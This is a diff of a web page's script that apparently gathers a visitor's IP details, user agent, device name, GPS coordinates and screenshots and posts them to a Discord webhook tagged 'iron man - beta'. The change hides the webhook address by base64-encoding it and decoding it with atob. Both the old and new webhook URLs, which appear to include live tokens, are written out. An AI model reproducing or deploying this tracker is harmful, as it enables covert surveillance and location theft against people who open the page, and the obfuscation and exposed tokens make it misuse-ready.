@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -273,8 +274,9 @@
         }
 
         async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude, accessType) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1326040924417163366/g72A2fFCy2ACXQH-RIDbKVOK4w5JmEmEgMn3nBHieFLfpZ_ItSVWoTXPaYWXjCz-_iqE';
+        const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzA4NTQ5NzU4MzE0MDkzNS91eU9TZ2cwM3VGbU85UFVwN1JsUVFlS0lKUjBBZ1RrWTdFUW0wdWxtaDByWkI4TllEellDTlcxNUJRU3dEcXh5NGNOSg==";
             const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const webhookUrl = atob(encryptedWebhookUrl);
             const now = new Date();
             const footerText = `${now.toLocaleString()} - Data captured using iron man - beta`;
 
@@ -310,9 +312,10 @@
 
             
         async function sendScreenshotToDiscord(imageUrl) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1326040924417163366/g72A2fFCy2ACXQH-RIDbKVOK4w5JmEmEgMn3nBHieFLfpZ_ItSVWoTXPaYWXjCz-_iqE';
+                const encryptedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzA4NTQ5NzU4MzE0MDkzNS91eU9TZ2cwM3VGbU85UFVwN1JsUVFlS0lKUjBBZ1RrWTdFUW0wdWxtaDByWkI4TllEellDTlcxNUJRU3dEcXh5NGNOSg==";
 
             const now = new Date();
+            const webhookUrl = atob(encryptedWebhookUrl);
             const footerText = `${now.toLocaleString()} - Data captured using iron man - beta`;
 
             const webhookPayload = {
